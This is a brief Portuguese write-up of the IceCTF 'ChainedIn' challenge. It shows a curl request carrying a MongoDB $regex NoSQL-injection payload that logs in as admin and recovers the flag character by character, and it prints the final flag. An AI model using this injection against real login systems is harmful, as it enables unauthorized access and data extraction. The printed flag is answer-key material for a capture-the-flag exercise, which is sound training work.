# ChainedIn

O desafio consistia em realizar um NoSQL injection, o database utilizado era o MongoDB, sabendo disso procurei funções que me fariam logar como administrador, o problema é que não bastava apenas logar como administrador mas sim fazer um datamining na base para conseguir a flag, apesar do pouco conhecimento em NoSQL principalmente MongoDB, consegui a flag utilizando $regex

```
curl -iL http://chainedin.vuln.icec.tf/login \
-H 'Accept: application/json, text/plain, /' \
-H 'Content-Type: application/json;charset=UTF-8' \
-d '{ "user": "admin", "pass": { "$regex": "^IceCTF.." } }'
```

Cada consulta, só me deixava logar como admin quando a proxima letra batia, desta forma, consegui formar a flag completamente.

```
IceCTF{I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo}
```
